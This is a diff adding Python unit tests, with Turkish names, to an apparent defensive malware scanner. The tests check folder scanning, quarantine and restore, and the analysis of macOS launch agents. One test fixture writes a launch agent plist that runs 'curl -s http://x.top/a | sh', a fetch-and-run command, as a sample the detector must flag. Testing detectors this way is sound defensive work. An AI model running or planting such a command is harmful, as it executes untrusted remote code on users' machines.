@@ -192,6 +192,84 @@ class IndirmeGuvenlikTest(unittest.TestCase):
                 config.INDIRME_DIZINI = eski
 
 
+class SistemTaramaTest(unittest.TestCase):
+    def setUp(self):
+        from kalkan import config, store
+        store.hazirla()
+        self.d = tempfile.mkdtemp(prefix="kalkan-pc-")
+        self.eski_karantina = config.KARANTINA_DIR
+        config.KARANTINA_DIR = __import__("pathlib").Path(self.d) / "karantina"
+
+    def tearDown(self):
+        from kalkan import config
+        config.KARANTINA_DIR = self.eski_karantina
+
+    def _bekle(self, is_id):
+        import time
+        from kalkan import sistem_tarama
+        while sistem_tarama.durum(is_id)["durum"] == "calisiyor":
+            time.sleep(0.05)
+        return sistem_tarama.durum(is_id)
+
+    def test_klasor_taramasi_ve_karantina(self):
+        from kalkan import karantina, sistem_tarama
+        k = os.path.join(self.d, "indir")
+        os.makedirs(os.path.join(k, "node_modules"))
+        with open(os.path.join(k, "dekont.pdf.exe"), "wb") as f:
+            f.write(b"MZ" + b"\0" * 100)
+        with open(os.path.join(k, "node_modules", "x.pdf.exe"), "wb") as f:  # atlanan klasör
+            f.write(b"MZ" + b"\0" * 100)
+        with open(os.path.join(k, "foto.jpg"), "wb") as f:
+            f.write(b"\xff\xd8\xff" + b"\0" * 100)
+        with open(os.path.join(k, "arac"), "wb") as f:  # macOS programı: olağan
+            f.write(b"\xcf\xfa\xed\xfe" + b"\0" * 100)
+        with open(os.path.join(k, "kurulum.dmg"), "wb") as f:  # kurulum dosyası: olağan
+            f.write(b"koly" + b"\0" * 100)
+        with open(os.path.join(k, "~$rapor.docx"), "wb") as f:  # Word kilit dosyası
+            f.write(b"\0" * 162)
+        d = self._bekle(sistem_tarama.baslat("klasor", k))
+        self.assertEqual(d["durum"], "bitti")
+        self.assertEqual([os.path.basename(b["yol"]) for b in d["bulgular"]], ["dekont.pdf.exe"])
+
+        b = d["bulgular"][0]
+        meta = karantina.al(b["yol"], b["sha256"], b["nedenler"])
+        self.assertFalse(os.path.exists(b["yol"]))
+        self.assertEqual(len(karantina.listele()), 1)
+        karantina.geri_yukle(meta["id"])
+        self.assertTrue(os.path.exists(b["yol"]))
+        self.assertEqual(karantina.listele(), [])
+
+    def test_degisen_dosya_karantinaya_alinmaz(self):
+        from kalkan import karantina
+        yol = os.path.join(self.d, "a.exe")
+        with open(yol, "wb") as f:
+            f.write(b"MZ yeni icerik")
+        with self.assertRaises(ValueError):
+            karantina.al(yol, "0" * 64, [])
+        self.assertTrue(os.path.exists(yol))
+
+    def test_baslangic_ogeleri(self):
+        import plistlib
+        from pathlib import Path
+        from kalkan.sistem_tarama import baslangic_ogesi_analiz
+        kotu = Path(self.d) / "com.guncelle.plist"
+        plistlib.dump({"Label": "com.guncelle", "ProgramArguments": ["/bin/bash", "-c", "curl -s http://x.top/a | sh"]},
+                      open(kotu, "wb"))
+        iyi = Path(self.d) / "com.dropbox.plist"
+        plistlib.dump({"Label": "com.dropbox", "ProgramArguments": ["/Applications/Dropbox.app/Contents/MacOS/Dropbox"]},
+                      open(iyi, "wb"))
+        gizli = Path(self.d) / "com.x.plist"
+        plistlib.dump({"Label": "com.x", "Program": "/tmp/.x/ajan"}, open(gizli, "wb"))
+        self.assertEqual(baslangic_ogesi_analiz(kotu).seviye, "tehlikeli")
+        self.assertIsNone(baslangic_ogesi_analiz(iyi))
+        self.assertNotEqual(baslangic_ogesi_analiz(gizli).seviye, "guvenli")
+
+    def test_pdf_icindeki_rastgele_iex_alarm_vermez(self):
+        # Gerçek PDF'lerde sıkıştırılmış veride rastgele "IeX" yanlış alarm üretiyordu
+        s = dosya_analiz(b"%PDF-1.7\nstream\x89IeX\x02\x91endstream", "belge.pdf", baglam="sistem")
+        self.assertEqual(s.seviye, "guvenli")
+
+
 class LlmBirlestirmeTest(unittest.TestCase):
     def test_llm_tehlikeliyi_dusuremez(self):
         s = dosya_analiz(EICAR, "x.txt")
